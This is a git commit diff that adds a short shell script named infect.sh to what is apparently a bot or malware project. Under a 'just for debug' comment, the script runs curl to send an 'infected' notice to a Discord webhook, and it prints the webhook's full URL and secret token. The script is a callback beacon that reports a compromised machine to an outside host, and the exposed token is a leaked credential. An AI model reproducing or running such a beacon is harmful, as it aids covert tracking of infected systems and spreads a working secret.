6f59f0709e9465b1f25be9997048661567501da3
vaapaty <113309094+vaapaty@users.noreply.github.com>
2022-09-16 21:48:03 +0300

    Update and rename bin/infect.sh to astia/infect.sh

---
+++ astia/infect.sh
@@ -0,0 +1,2 @@
+# This is just for debug :)
+curl -H "Content-Type: application/json" -d '{"username": "HBot", "content": "infected"}' "https://discord.com/api/webhooks/1020405632588841021/dc0Tj4kMWF87H-JJERX27F5zb38taQF5dXSy5k7I4nkeyaUA3dAHfRyxBCC0nWqn2Vne"
